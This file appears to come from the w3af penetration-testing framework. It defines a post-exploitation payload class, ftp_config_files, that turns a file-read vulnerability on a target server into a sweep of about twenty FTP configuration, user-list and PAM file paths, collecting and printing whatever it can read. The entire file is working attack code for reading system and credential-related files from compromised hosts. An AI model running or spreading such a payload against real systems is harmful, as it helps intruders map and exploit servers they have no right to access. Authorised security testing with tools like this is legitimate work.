from w3af.plugins.attack.payloads.base_payload import Payload


class ftp_config_files(Payload):
    """
    This payload shows FTP Server configuration files
    """
    def fname_generator(self):
        yield '/etc/ftpd/ftpaccess'
        yield '/etc/ftpd/ftpconversions'
        yield '/etc/ftpd/ftphosts'
        yield '/etc/ftpd/ftpusers'
        yield '/etc/ftpd/ftpgroups'
        yield '/etc/vsftpd.ftpusers'
        yield '/etc/vsftpd/ftpusers'
        yield '/etc/vsftpd.conf'
        yield '/etc/vsftpd/vsftpd.conf'
        yield '/etc/vsftp/vsftpd.conf'
        yield '/usr/local/etc/vsftpd.conf'
        yield '/opt/etc/vsftpd.conf'
        yield '/etc/vsftpd.user_list'
        yield '/etc/vsftpd/user_list'
        yield '/etc/pam.d/vsftpd'
        yield '/etc/ftpaccess'
        yield '/etc/ftpusers'
        yield '/etc/ftpservers'
        yield '/etc/ftphosts'
        yield '/etc/ftpconversions'
        yield '/etc/pam.d/ftp'
        yield '/etc/xinetd.d/wu-ftpd'
        yield '/opt/bin/ftponly'

    def api_read(self):
        result = {}

        fname_iter = self.fname_generator()
        for file_path, content in self.read_multi(fname_iter):
            if content:
                result.update({file_path: content})

        return result

    def run_read(self):
        api_result = self.api_read()
        result = []
        if api_result:
            result.append('FTP Config Files')
            for file_, content in api_result.iteritems():
                result.append('-------------------------')
                result.append(file_)
                result.append('-------------------------')
                result.append(content)

        if result == []:
            result.append('FTP configuration files not found.')
        return result
